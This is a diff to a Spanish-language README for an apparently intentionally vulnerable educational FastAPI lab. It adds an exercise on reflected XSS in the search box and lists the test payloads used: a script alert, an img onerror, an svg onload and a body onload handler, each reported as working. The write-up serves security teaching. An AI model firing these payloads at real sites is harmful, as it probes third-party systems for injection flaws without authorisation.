@@ -150,6 +150,41 @@ http://localhost:8000
 ![FastAPI](https://img.shields.io/badge/FastAPI-0.115.5-green.svg)
 ![License](https://img.shields.io/badge/License-Educational-red.svg)
 
+
+## 🧪 Ejercicio 1 — Reflected XSS (Búsqueda Vulnerable)
+
+En este ejercicio se explora una vulnerabilidad de tipo **Reflected XSS**, presente en el buscador del sistema.  
+La entrada del usuario se refleja directamente en la página sin aplicar ningún escape HTML.
+
+---
+
+##  Payloads probados
+
+A continuación se muestran los payloads utilizados y sus respectivos resultados.
+
+---
+
+###  1. Payload principal — Popup exitoso
+
+**Payload:**
+
+```html
+<script>alert('XSS Reflected!')</script>
+
+##  Las imagenes se encuentran en la carpeta imgpruebasXSS ya que no supe como referenciarlas en el readme
+
+![XSS Popup](imgpruebasXSS/xss_popup.png) 
+Payload alternativo: etiqueta <img> con onerror
+
+Payload:
+
+<img src=x onerror=alert('XSS!')>
+
+<svg onload=alert('XSS')>
+<body onload=alert('XSS')>
+
+Resultado: Ejercicio exitoso.
+
 ## ⚠️ ADVERTENCIA IMPORTANTE
 
 **Este laboratorio es INTENCIONALMENTE VULNERABLE y está diseñado EXCLUSIVAMENTE para fines educativos.**
